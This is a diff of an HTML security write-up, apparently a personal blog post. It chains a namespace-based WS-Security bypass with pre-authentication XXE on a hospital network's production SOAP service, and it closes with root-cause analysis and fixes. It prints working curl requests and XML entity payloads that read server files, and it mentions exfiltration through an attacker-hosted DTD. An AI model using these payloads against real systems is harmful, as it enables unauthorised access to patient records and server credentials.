@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>XXE and Authentication Bypass on a Hospital Network's SOAP Service — r1gor</title>
+  <title>XXE and Auth Bypass on a Hospital SOAP Service — r1gor</title>
   <link rel="stylesheet" href="../style.css">
 </head>
 <body>
@@ -21,18 +21,27 @@
 <hr class="section-rule">
 <a href="../" class="back">all write-ups</a>
 <article>
-<h1>XXE and Authentication Bypass on a Hospital Network's SOAP Service</h1>
-<p>Target: the eHealth integration hub of a major Belgian hospital network. Handles patient medical records, lab results, discharge letters, prescriptions. Production system, directly on the internet, no WAF, no Cloudflare. The SOAP stack was JAX-WS Metro 2.2.1, built in 2012.</p>
+<h1>XXE and Auth Bypass on a Hospital SOAP Service</h1>
+<p>Target is the eHealth integration hub of a major Belgian hospital
+network. Handles patient medical records, lab results, discharge
+letters, prescriptions. Production system, directly on the
+internet, no WAF, no Cloudflare. The SOAP stack was JAX-WS Metro
+2.2.1, built in 2012.</p>
 <p>Two findings, and they chain together.</p>
-<h2>Finding 1: WS-Security bypass via namespace trick</h2>
-<p>The SOAP service enforces WS-Security authentication through SAML 1.1 tokens with XML signatures. But the enforcement is conditional. It only activates when the SOAP body uses the eHealth target namespace.</p>
+<h2>finding 1: WS-Security bypass via namespace trick</h2>
+<p>The SOAP service enforces WS-Security authentication through SAML
+1.1 tokens with XML signatures. But the enforcement is conditional.
+It only activates when the SOAP body uses the eHealth target
+namespace.</p>
 <p>With the target namespace (blocked):</p>
 <pre><code class="language-bash">curl -X POST &quot;https://[TARGET]/services/intrahub/IntraHubService&quot; \
   -H &quot;Content-Type: text/xml&quot; \
-  -d '&lt;?xml version=&quot;1.0&quot;?&gt;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;
+  -d '&lt;?xml version=&quot;1.0&quot;?&gt;&lt;soapenv:Envelope
+  xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;
   xmlns:v1=&quot;http://www.ehealth.fgov.be/hubservices/protocol/v1&quot;&gt;
   &lt;soapenv:Header/&gt;&lt;soapenv:Body&gt;
-  &lt;v1:GetTransactionListRequest/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;'
+  &lt;v1:GetTransactionListRequest/&gt;
+  &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;'
 </code></pre>
 <pre><code class="language-xml">&lt;faultcode&gt;wsse:InvalidSecurity&lt;/faultcode&gt;
 &lt;faultstring&gt;Invalid Security Header&lt;/faultstring&gt;
@@ -40,18 +49,28 @@
 <p>Without namespace (bypassed):</p>
 <pre><code class="language-bash">curl -X POST &quot;https://[TARGET]/services/intrahub/IntraHubService&quot; \
   -H &quot;Content-Type: text/xml&quot; \
-  -d '&lt;?xml version=&quot;1.0&quot;?&gt;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  -d '&lt;?xml version=&quot;1.0&quot;?&gt;&lt;soapenv:Envelope
+  xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
   &lt;soapenv:Header/&gt;&lt;soapenv:Body&gt;
-  &lt;GetTransactionListRequest/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;'
+  &lt;GetTransactionListRequest/&gt;
+  &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;'
 </code></pre>
 <pre><code class="language-xml">&lt;faultcode&gt;ns2:Client&lt;/faultcode&gt;
-&lt;faultstring&gt;Cannot find dispatch method for {}GetTransactionListRequest&lt;/faultstring&gt;
+&lt;faultstring&gt;Cannot find dispatch method for
+  {}GetTransactionListRequest&lt;/faultstring&gt;
 </code></pre>
-<p>No auth check. The body is parsed, the operation name is looked up in the dispatch registry, and it returns a dispatch error. The <code>{}</code> prefix confirms the element was processed with an empty namespace. Any namespace works as long as it is not the eHealth one.</p>
-<p>The WS-Security policy is bound to the operation namespace instead of the transport layer. Skip the namespace, skip the auth.</p>
-<h2>Finding 2: XXE via DTD processing (pre-auth)</h2>
-<p>With the auth bypass established, the next question: what can you do with unauthenticated XML parsing?</p>
-<p>The XML parser has DTD processing enabled. I confirmed this through differential response analysis. Three requests, three different server behaviors:</p>
+<p>No auth check. The body is parsed, the operation name is looked up
+in the dispatch registry, and it returns a dispatch error. The <code>{}</code>
+prefix confirms the element was processed with an empty namespace.
+Any namespace works as long as it is not the eHealth one.</p>
+<p>The WS-Security policy is bound to the operation namespace instead
+of the transport layer. Skip the namespace, skip the auth.</p>
+<h2>finding 2: XXE via DTD processing (pre-auth)</h2>
+<p>With the auth bypass established, next question. What can you do
+with unauthenticated XML parsing?</p>
+<p>The XML parser has DTD processing enabled. I confirmed this through
+differential response analysis. Three requests, three different
+server behaviors:</p>
 <table>
 <thead>
 <tr>
@@ -69,48 +88,64 @@
 <tr>
 <td>Internal entity in text</td>
 <td><code>&lt;!ENTITY e "val"&gt;</code></td>
-<td><strong>Parser crash</strong>: <code>SAXParseException: Internal XSB error: Invalid State=0</code></td>
+<td>Parser crash: <code>SAXParseException: Internal XSB error: Invalid State=0</code></td>
 </tr>
 <tr>
 <td>SYSTEM entity in attribute</td>
 <td><code>&lt;!ENTITY e SYSTEM "file:///etc/hostname"&gt;</code></td>
-<td><strong>Different code path</strong>: <code>wsse:InvalidSecurity</code></td>
+<td>Different code path: <code>wsse:InvalidSecurity</code></td>
 </tr>
 </tbody>
 </table>
-<p>If DTD processing was disabled, all three would return the same dispatch error. Instead:</p>
+<p>If DTD processing was disabled, all three would return the same
+dispatch error. Instead:</p>
 <ul>
 <li>The internal entity crashes the SAX parser during expansion</li>
-<li>The SYSTEM entity pointing to <code>file:///etc/hostname</code> gets resolved and injected into an attribute, altering the parsed XML tree enough to trigger a different code path</li>
+<li>The SYSTEM entity pointing to <code>file:///etc/hostname</code> gets resolved
+  and injected into an attribute, altering the parsed XML tree
+  enough to trigger a different code path</li>
 </ul>
 <pre><code class="language-bash">curl -X POST &quot;https://[TARGET]/services/intrahub/IntraHubService&quot; \
   -H &quot;Content-Type: text/xml&quot; \
-  -d '&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY e SYSTEM &quot;file:///etc/hostname&quot;&gt;]&gt;
-  &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  -d '&lt;?xml version=&quot;1.0&quot;?&gt;
+  &lt;!DOCTYPE foo [&lt;!ENTITY e SYSTEM &quot;file:///etc/hostname&quot;&gt;]&gt;
+  &lt;soapenv:Envelope
+  xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
   &lt;soapenv:Header/&gt;&lt;soapenv:Body&gt;
   &lt;test attr=&quot;&amp;e;&quot;&gt;a&lt;/test&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;'
 </code></pre>
-<p>The entity is resolved. With an out-of-band exfiltration setup (external DTD hosted on attacker server), you could read files from the hospital hub server. Config files, credentials, potentially patient data.</p>
-<h2>The chain</h2>
+<p>The entity is resolved. With an out-of-band exfiltration setup
+(external DTD hosted on attacker server), you read files from the
+hospital hub server. Config files, credentials, potentially patient
+data.</p>
+<h2>the chain</h2>
 <ol>
 <li>Skip WS-Security by omitting the eHealth namespace</li>
 <li>Server parses XML body without authentication</li>
 <li>DTD processing is enabled on the unauthenticated parser</li>
 <li>Inject SYSTEM entities for file read or SSRF</li>
 </ol>
-<p>Zero credentials required. Production healthcare system. Patient records. No WAF between you and the SOAP endpoint.</p>
-<h2>Root cause</h2>
+<p>Zero credentials required. Production healthcare system. Patient
+records. No WAF between you and the SOAP endpoint.</p>
+<h2>root cause</h2>
 <p>Two legacy decisions compounding:</p>
 <ol>
-<li>WS-Security bound to namespace instead of transport. The security interceptor asks "is this an eHealth operation?" instead of "is this request authenticated?"</li>
-<li>Metro 2.2.1 (2012) ships with DTD processing enabled by default. Modern versions disable it.</li>
+<li>WS-Security bound to namespace instead of transport. The security
+   interceptor asks "is this an eHealth operation?" instead of "is
+   this request authenticated?"</li>
+<li>Metro 2.2.1 (2012) ships with DTD processing enabled by default.
+   Modern versions disable it.</li>
 </ol>
 <p>Fix for the XXE:</p>
 <pre><code class="language-java">SAXParserFactory spf = SAXParserFactory.newInstance();
-spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
+spf.setFeature(
+  &quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
 </code></pre>
-<p>Fix for the auth bypass: enforce WS-Security at the transport/envelope level, not the operation level. Or put a servlet filter in front that rejects any POST without a <code>wsse:Security</code> header.</p>
-<p>Upgrading from a 14-year-old SOAP stack would also help.</p>
+<p>Fix for the auth bypass: enforce WS-Security at the
+transport/envelope level, not the operation level. Or put a servlet
+filter in front that rejects any POST without a <code>wsse:Security</code>
+header.</p>
+<p>Upgrading from a 14 year old SOAP stack would also help.</p>
 </article>
 </main>
 <footer>
